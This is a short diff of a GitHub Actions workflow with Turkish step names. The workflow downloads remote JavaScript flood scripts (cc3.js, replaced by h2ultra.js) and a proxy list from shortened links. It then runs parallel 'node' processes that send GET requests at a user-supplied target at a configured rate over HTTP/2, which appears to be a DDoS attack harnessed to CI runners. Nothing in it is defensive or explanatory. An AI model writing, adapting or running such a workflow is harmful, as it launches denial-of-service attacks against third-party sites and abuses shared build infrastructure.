@@ -26,9 +26,9 @@ jobs:
     steps:
     - name: Dosyaları indir ve hazırla
       run: |
-        wget https://curl.by/cnsxx/cc3.js
+        wget https://curl.by/4pq1U/h2ultra.js
         wget https://curl.by/q9W_R/gon.txt
-        chmod +x cc3.js
+        chmod +x h2ultra.js
         npm i hpack https commander colors 
     - name: run
       run: |
@@ -37,8 +37,8 @@ jobs:
         RATE="${{ inputs.rate }}"
         
         PIDS=()
-        for i in {1..96}; do
-          sudo timeout $TIME node cc3.js GET "$TARGET" 200 10 "$RATE" gon.txt --full  --http 2 --winter
+        for i in {1..4}; do
+          sudo timeout $TIME node h2ultra.js GET "$TARGET" 150 24 "$RATE" gon.txt --full
           PIDS+=($!)
         done
         
